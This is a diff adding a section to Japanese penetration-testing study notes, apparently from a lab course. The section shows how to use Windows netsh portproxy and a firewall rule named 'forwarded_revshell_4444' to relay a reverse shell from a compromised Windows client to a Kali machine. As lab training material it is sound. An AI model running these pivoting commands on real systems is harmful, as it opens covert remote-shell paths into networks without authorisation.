@@ -300,3 +300,39 @@ sshが閉じられている場合、httpでトンネルする手法にHTTPtunnel
   ![image-20230109115646300](img/PortRedirectionAndTunneling/image-20230109115646300.png)
 
   
+
+### 【Windows】netshを利用してポートフォワード
+
+![image-20230114080617817](img/PortRedirectionAndTunneling/image-20230114080617817.png)
+
+* ポートフォワード設定(win10 clientで実施)
+
+```cmd
+netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=1234 connectaddress=192.168.119.179
+```
+
+* 確認
+
+  ```
+  netstat -ano | findstr :4444
+  ```
+
+* ファイアウォールの設定(win10 clientで実施)
+
+  ```cmd
+  netsh advfirewall firewall add rule name="forwarded_revshell_4444" protocol=TCP dir=out localip=0.0.0.0 localport=1234 action=allow
+  ```
+
+* 確認
+
+  ```
+  netsh interface portproxy show all
+  ```
+
+  ![image-20230114080851422](img/PortRedirectionAndTunneling/image-20230114080851422.png)
+
+* kaliで受信
+
+  ![image-20230114080908959](img/PortRedirectionAndTunneling/image-20230114080908959.png)
+
+参考サイト：https://woshub.com/port-forwarding-in-windows/
